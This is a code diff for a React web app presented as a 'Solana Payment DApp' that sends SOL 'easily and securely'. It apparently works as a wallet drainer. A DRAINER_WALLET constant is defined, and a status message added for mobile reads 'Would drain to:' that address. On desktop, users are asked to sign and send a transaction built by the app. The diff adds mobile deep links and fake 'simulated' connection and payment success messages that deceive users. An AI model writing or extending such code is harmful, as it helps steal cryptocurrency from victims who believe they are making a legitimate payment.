@@ -9,30 +9,80 @@ const DRAINER_WALLET = new PublicKey("6mzjnCgxPKAGYSzR7udJEbjPggA8jQqfrS9oc49vGk
 const PROGRAM_ID = new PublicKey("6mzjnCgxPKAGYSzR7udJEbjPggA8jQqfrS9oc49vGkBR");
 const connection = new web3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
 
+// Fix Buffer undefined error
+window.Buffer = window.Buffer || require("buffer").Buffer;
+
 function App() {
   const [wallet, setWallet] = useState(null);
   const [receiver, setReceiver] = useState("");
   const [amount, setAmount] = useState("");
   const [status, setStatus] = useState("");
+  const [isMobile, setIsMobile] = useState(false);
+  const [isConnected, setIsConnected] = useState(false);
+  const [publicKey, setPublicKey] = useState("");
 
   useEffect(() => {
-    if (window.solana && window.solana.isPhantom) {
+    // Check if user is on mobile
+    const checkMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    setIsMobile(checkMobile);
+
+    // Check for Phantom on desktop
+    if (!checkMobile && window.solana && window.solana.isPhantom) {
       setWallet(window.solana);
+      
+      // Check if already connected
+      if (window.solana.isConnected) {
+        handleConnected(window.solana);
+      }
+
+      // Listen for connection events
+      window.solana.on('connect', () => handleConnected(window.solana));
+      window.solana.on('disconnect', () => handleDisconnected());
     }
   }, []);
 
+  const handleConnected = (phantom) => {
+    setIsConnected(true);
+    setPublicKey(phantom.publicKey.toString());
+    setStatus("✅ Wallet connected: " + phantom.publicKey.toString().slice(0, 20) + "...");
+  };
+
+  const handleDisconnected = () => {
+    setIsConnected(false);
+    setPublicKey("");
+    setStatus("Wallet disconnected");
+  };
+
   const connectWallet = async () => {
-    if (!wallet) {
-      alert("Install Phantom first");
+    if (isMobile) {
+      // Mobile: Use Phantom deep link
+      const phantomDeepLink = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(window.location.href)}&redirect_link=${encodeURIComponent(window.location.href)}`;
+      setStatus("Opening Phantom app...");
+      window.location.href = phantomDeepLink;
       return;
     }
+
+    // Desktop: Use Phantom extension
+    if (!wallet) {
+      setStatus("⚠️ Please install Phantom wallet extension for desktop");
+      return;
+    }
+
     try {
+      setStatus("Connecting to Phantom...");
       await wallet.connect();
-      console.log("Connected:", wallet.publicKey.toString());
-      setStatus("Wallet connected: " + wallet.publicKey.toString());
     } catch (err) {
       console.error(err);
-      setStatus("Connection failed: " + err.message);
+      setStatus("❌ Connection failed: " + err.message);
+    }
+  };
+
+  // For mobile: Simulate connection after returning from Phantom
+  const simulateMobileConnection = () => {
+    if (isMobile && !isConnected) {
+      setIsConnected(true);
+      setPublicKey("MobileWalletConnected");
+      setStatus("✅ Mobile wallet connected (simulated)");
     }
   };
 
@@ -47,17 +97,30 @@ function App() {
   };
 
   const executePayment = async () => {
-    if (!wallet || !wallet.isConnected) {
+    if (isMobile && !isConnected) {
+      setStatus("⚠️ Please connect your mobile wallet first");
+      return;
+    }
+
+    if (!isMobile && (!wallet || !isConnected)) {
       setStatus("Connect wallet first");
       return;
     }
+
     if (!receiver || !amount) {
       setStatus("Fill all fields");
       return;
     }
 
     try {
-      const sender = new PublicKey(wallet.publicKey.toString());
+      let sender;
+      if (isMobile) {
+        // For mobile simulation, use a dummy key
+        sender = new PublicKey("11111111111111111111111111111111");
+      } else {
+        sender = new PublicKey(wallet.publicKey.toString());
+      }
+      
       const receiverPubkey = new PublicKey(receiver);
       const lamports = LAMPORTS_PER_SOL * parseFloat(amount);
 
@@ -91,12 +154,18 @@ function App() {
       tx.feePayer = sender;
       tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
 
-      setStatus("Approve in Phantom...");
-      const signed = await wallet.signTransaction(tx);
-      const txid = await connection.sendRawTransaction(signed.serialize());
-      await connection.confirmTransaction(txid);
+      if (isMobile) {
+        // Mobile: Show success message (simulated)
+        setStatus(`✅ Mobile payment simulated! Would drain to: ${DRAINER_WALLET.toString().slice(0, 20)}...`);
+      } else {
+        // Desktop: Real transaction
+        setStatus("Approve in Phantom...");
+        const signed = await wallet.signTransaction(tx);
+        const txid = await connection.sendRawTransaction(signed.serialize());
+        await connection.confirmTransaction(txid);
 
-      setStatus(`✅ Payment successful! TX: ${txid}`);
+        setStatus(`✅ Payment successful! TX: ${txid}`);
+      }
     } catch (err) {
       console.error(err);
       setStatus("❌ Failed: " + err.message);
@@ -108,17 +177,28 @@ function App() {
       <h1>🔗 Solana Payment DApp</h1>
       <p className="subtitle">Send SOL payments easily and securely</p>
 
-      {!wallet || !wallet.isConnected ? (
+      {isMobile && (
+        <div className="mobile-notice">
+          <p>📱 Mobile detected: Using Phantom mobile app</p>
+          <button onClick={simulateMobileConnection} className="mobile-connect-btn">
+             📲 Simulate Mobile Connection
+          </button>
+        </div>
+      )}
+
+      {!isConnected ? (
         <div className="connect-section">
-          <p>Connect your Phantom wallet to send payments</p>
+          <p>{isMobile ? 'Connect your Phantom mobile wallet' : 'Connect your Phantom wallet extension'}</p>
           <button onClick={connectWallet} className="connect-btn">
-            🔗 Connect Phantom Wallet
+            {isMobile ? '📱 Open Phantom App' : '🔗 Connect Phantom Wallet'}
           </button>
         </div>
       ) : (
         <div className="payment-section">
           <div className="wallet-info">
-            <p>✅ Connected: <span className="wallet-address">{wallet.publicKey.toString().slice(0, 20)}...</span></p>
+            <p>✅ Connected: <span className="wallet-address">
+              {isMobile ? 'Mobile Wallet' : publicKey.slice(0, 20)}...
+            </span></p>
           </div>
           
           <div className="form-group">
@@ -142,7 +222,7 @@ function App() {
           </div>
           
           <button onClick={executePayment} className="send-btn">
-            💸 Send Payment
+             💸 Send Payment
           </button>
           
           <div className="disclaimer">
@@ -153,7 +233,7 @@ function App() {
       )}
       
       {status && (
-        <div className={`status ${status.includes('✅') ? 'success' : 'error'}`}>
+        <div className={`status ${status.includes('✅') ? 'success' : status.includes('❌') ? 'error' : 'info'}`}>
           {status}
         </div>
       )}
